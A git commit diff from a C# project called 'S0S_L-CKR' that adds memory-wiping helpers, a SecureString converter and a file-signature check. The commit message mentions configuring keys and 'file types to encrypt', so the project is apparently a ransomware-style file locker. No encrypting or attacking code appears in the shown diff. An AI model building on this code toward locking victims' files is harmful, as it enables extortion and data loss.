033c2c55f930bf4034434f299eda11056acf7fa3
X3ASS3xE <t0ge@Elys-MacBook-Pro.local>
2021-03-20 14:21:31 -0500

    Added ConfigManager Class
    Added basic configuration methods for key size, key names, paths, and file types to encrypt

--- S0S_L-CKR/s0s_L-ckr/Comn.cs
+++ S0S_L-CKR/s0s_L-ckr/Comn.cs
@@ -14,19 +14,72 @@ namespace s0s_L_ckr
         }
 
         public static readonly Random rand = new Random();
+
+        [MethodImpl(MethodImplOptions.AggressiveInlining)]
         public static void ClearArray(ref byte[] array)
         {
+            //CLEAR ARRAY FROM MEM
+            for (int i = 0; i < array.Length; i++)
+            {
+                array[i] = (byte)rand.Next(0, 255);
+            }
         }
-        public static unsafe void ClearString(ref string str)
+
+        [MethodImpl(MethodImplOptions.AggressiveInlining)]
+        public static unsafe void ClearString(ref string strg)
         {
-            if
+            //CLEAR STRING FROM MEM
+            if (strg == null)
+                return;
+            int strgLen = strg.Length;
+            fixed (char* ptr = strg)
+            {
+                for (int i = 0; i < strgLen; i++)
+                {
+                    ptr[i] = (char)rand.Next(0, 255);
+                }
+             }
         }
+
+
         public static void OpenSecStr(ref String dest, ref SecureString srce)
         {
+            //OPEN SECURE STRING METHOD
+            IntPtr unmanStr = IntPtr.Zero;
+
+            try
+            {
+                unmanStr = Marshal.SecureStringToGlobalAllocUnicode(srce);
+                dest = Marshal.PtrToStringUni(unmanStr);
+            }
+            finally
+            {
+                Marshal.ZeroFreeGlobalAllocUnicode(unmanStr);
+            }
         }
 
         public static Boolean CheckSig(FileInfo file)
         {
+            //CHECK FILE SIG
+
+            Boolean result = true;
+
+            using (FileStream fileStm = File.OpenRead(file.FullName))
+            {
+                byte[] bData = new byte[ConfigMgr.FILE_SIGN_SIZE];
+                fileStm.Read(bData, 0, bData.Length);
+
+                for (int i = 0; i < ConfigMgr.FILE_SIGN_SIZE; i++)
+                {
+                    if (!(bData[i] == ConfigMgr.FILE_SIGN[i]))
+                    {
+                        result = false;
+                        break;
+                    }
+                }
+            }
+
+            return result;
 
         }
 
